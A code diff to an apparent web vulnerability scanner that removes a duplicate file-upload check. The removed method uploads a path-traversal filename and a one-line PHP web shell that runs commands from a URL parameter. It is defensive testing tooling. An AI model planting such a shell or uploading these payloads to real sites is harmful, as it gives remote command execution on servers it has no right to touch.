@@ -310,29 +310,6 @@ class WebScanner:
             except requests.RequestException as e:
                 logger.error(f"Error during request to {test_url}: {e}")
         return False
-
-
-    def check_file_upload(self, form_url):
-        meta_char_file = {'file': ('../test.txt', 'This is a test file.')}
-        web_shell_file = {'file': ('shell.php', '<?php echo shell_exec($_GET["cmd"]); ?>')}
-
-        try:
-            response = session.post(form_url, files=meta_char_file, timeout=10)
-            if response.status_code == 200 and "../test.txt" in response.text:
-                logger.info(f"Meta character file upload successful at {form_url}")
-                return True
-        except requests.RequestException as e:
-            logger.error(f"Error during meta character file upload to {form_url}: {e}")
-
-        try:
-            response = session.post(form_url, files=web_shell_file, timeout=10)
-            if response.status_code == 200 and "shell.php" in response.text:
-                logger.info(f"Web shell file upload successful at {form_url}")
-                return True
-        except requests.RequestException as e:
-            logger.error(f"Error during web shell file upload to {form_url}: {e}")
-
-        return False
     
     def check_file_upload(self, url):
         try:
